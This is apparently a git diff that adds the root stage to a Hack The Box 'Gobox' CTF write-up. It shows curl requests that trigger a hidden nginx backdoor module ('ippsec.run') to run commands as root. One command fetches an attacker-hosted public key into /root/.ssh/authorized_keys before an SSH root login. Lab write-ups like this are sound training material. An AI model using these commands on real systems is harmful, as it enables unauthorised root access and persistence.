@@ -3,7 +3,7 @@ layout: writeup
 category: HTB
 date: 2024-12-29
 comments: false
-tags: golang ssti serversidetemplateinjection burpsuite bucket s3 aws reverseshell php webshell 
+tags: golang ssti serversidetemplateinjection burpsuite bucket s3 aws reverseshell php webshell nginx backdoor commandon nginxexecute
 ---
 
 <br />
@@ -558,7 +558,7 @@ server {
 
 <br />
 
-The `"command on"` directive inmediately caught my attention.
+The `"command on"` directive inmmediately caught my attention.
 
 After googling it, we found a [Github repository] with some `key` information:
 
@@ -568,4 +568,88 @@ After googling it, we found a [Github repository] with some `key` information:
 
 <br />
 
+We found a `backdoor`!
 
+According to the `documentation` we try to run a command making a `request` to the server but it doesn't work:
+
+<br />
+
+```bash
+www-data@gobox:/etc/nginx/sites-enabled$ curl -g http://127.0.0.1:8000/?system.run["whoami"]
+curl: (52) Empty reply from server
+```
+
+<br />
+
+Unfortunately, we get no response, only an `empty` reply.
+
+To be sure we were looking at the right module, we search with `find` the `"ngx_http_execute_module.so"`:
+
+<br />
+
+```bash
+www-data@gobox:/etc/nginx/sites-enabled$ find / -name "ngx_http_execute_module.so" -type f 2>/dev/null
+/usr/lib/nginx/modules/ngx_http_execute_module.so
+www-data@gobox:/etc/nginx/sites-enabled$ ls -l /usr/lib/nginx/modules/ngx_http_execute_module.so
+-rw-r--r-- 1 root root 163896 Aug 23  2021 /usr/lib/nginx/modules/ngx_http_execute_module.so
+```
+
+<br />
+
+Now we use strings on the binary and filtered by `"run"` to see if the server uses a different option than command.run to `invoke` the backdoor:
+
+<br />
+
+```bash
+www-data@gobox:/etc/nginx/sites-enabled$ strings /usr/lib/nginx/modules/ngx_http_execute_module.so | grep "run"
+ippsec.run
+```
+
+<br />
+
+Boom! The correct trigger is `ippsec.run`, not command.run.
+
+We are able to run commands as root:
+
+<br />
+
+```bash
+www-data@gobox:/etc/nginx/sites-enabled$ curl -g http://127.0.0.1:8000/?ippsec.run["whoami"] 
+root
+```
+
+<br />
+
+To get a `shell`, we can replace root `authorized_keys`:
+
+<br />
+
+```bash
+curl -g http://127.0.0.1:8000/?ippsec.run["curl 10.10.14.21/id_rsa.pub -o /root/.ssh/authorized_keys"] 
+```
+
+<br />
+
+And connect via `ssh` from our attacker machine:
+
+<br />
+
+```bash
+❯ ssh -i ~/.ssh/id_rsa root@10.10.11.113
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)
+...[snip]...
+root@gobox:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@gobox:~# cat root.txt
+e21005dd75d1b3323ef985d4f8xxxxxx
+```
+
+<br />
+
+Machine Gobox pwned!!
+
+Hope you had learned a lot and enjoyed the machine as much I did!!
+
+Keep hacking!!❤️❤️
+
+<br />
